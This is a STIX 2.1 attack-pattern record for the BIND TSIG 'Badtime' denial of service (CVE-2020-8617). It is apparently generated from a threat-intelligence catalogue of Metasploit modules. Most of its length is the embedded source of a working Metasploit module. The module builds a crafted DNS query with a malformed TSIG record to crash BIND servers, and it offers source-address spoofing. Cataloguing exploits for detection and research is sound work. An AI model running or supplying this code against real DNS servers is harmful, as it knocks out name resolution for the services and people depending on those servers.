{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2039553c-c1de-4834-855c-3ad35232a91c",
    "created": "2024-08-14T16:24:28.284726Z",
    "modified": "2024-08-14T16:24:28.28473Z",
    "name": "BIND TSIG Badtime Query Denial of Service",
    "description": " A logic error in code which checks TSIG validity can be used to trigger an assertion failure in tsig.c. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/dns/bind_tsig_badtime.rb",
            "external_id": "bind_tsig_badtime.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-8617"
        },
        {
            "source_name": "reference",
            "url": "https://gitlab.isc.org/isc-projects/bind9/-/issues/1703"
        },
        {
            "source_name": "reference",
            "url": "https://www.trapkit.de/advisories/TKADV2020-002.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Capture\n  include Msf::Auxiliary::UDPScanner\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'BIND TSIG Badtime Query Denial of Service',\n        'Description' => %q{\n          A logic error in code which checks TSIG validity can be used to\n          trigger an assertion failure in tsig.c.\n        },\n        'Author' => [\n          'Tobias Klein',  # Research and Original PoC\n          'Shuto Imai',    # msf module author\n        ],\n        'References' => [\n          ['CVE', '2020-8617'],\n          ['URL', 'https://gitlab.isc.org/isc-projects/bind9/-/issues/1703'],\n          ['URL', 'https://www.trapkit.de/advisories/TKADV2020-002.txt']\n        ],\n        'DisclosureDate' => '2020-05-19',\n        'License' => MSF_LICENSE,\n        'DefaultOptions' => { 'ScannerRecvWindow' => 0 },\n        'Notes' => {\n          'Stability' => [CRASH_SERVICE_DOWN],\n          'SideEffects' => [],\n          'Reliability' => []\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(53),\n      OptAddress.new('SRC_ADDR', [false, 'Source address to spoof']),\n    ])\n\n    deregister_options('PCAPFILE', 'FILTER', 'SNAPLEN', 'TIMEOUT')\n  end\n\n  def scan_host(ip)\n    print_status(\"Sending packet to #{ip}\")\n    if datastore['SRC_ADDR']\n      scanner_spoof_send(payload, ip, rport, datastore['SRC_ADDR'])\n    else\n      scanner_send(payload, ip, rport)\n    end\n  end\n\n  def payload\n    query = Rex::Text.rand_text_alphanumeric(2) # Transaction ID: 0x8f65\n    query << \"\\x00\\x00\"  # Flags: 0x0000 Standard query\n    query << \"\\x00\\x01\"  # Questions: 1\n    query << \"\\x00\\x00\"  # Answer RRs: 0\n    query << \"\\x00\\x00\"  # Authority RRs: 0\n    query << \"\\x00\\x01\"  # Additional RRs: 1\n\n    # Domain Name\n    query << get_domain # Random DNS Name\n    query << \"\\x00\"      # [End of name]\n    query << \"\\x00\\x01\"  # Type: A (Host Address) (1)\n    query << \"\\x00\\x01\"  # Class: IN (0x0001)\n\n    # Additional records. Name\n    query << \"\\x0alocal-ddns\"\n    query << \"\\x00\"\n\n    query << \"\\x00\\xfa\" # Type: TSIG (Transaction Signature) (250)\n    query << \"\\x00\\xff\" # Class: ANY (0x00ff)\n    query << \"\\x00\\x00\\x00\\x00\" # Time to live: 0\n    query << \"\\x00\\x1d\" # Data length: 29\n\n    # Algorithm Name\n    query << \"\\x0bhmac-sha256\" # The algorithm for local-ddns is hmac-sha256\n    query << \"\\x00\"\n\n    # Rest of TSIG\n    query << \"\\x00\\x00\\x00\\x00\\x00\\x00\" # Time Signed: Jan  1, 1970 00:00:00.000000000 UTC\n    query << \"\\x00\\x00\" # Fudge: 0\n    query << \"\\x00\\x00\" # MAC Size: 0\n    query << \"\\x00\\x00\" # Original Id: 0\n    query << \"\\x00\\x10\" # Error: BadSig (16)\n    query << \"\\x00\\x00\" # Other len: 0\n  end\n\n  def get_domain\n    domain = \"\\x06#{Rex::Text.rand_text_alphanumeric(6)}\"\n    org = \"\\x03#{Rex::Text.rand_text_alphanumeric(3)}\"\n    domain + org\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-05-19"
}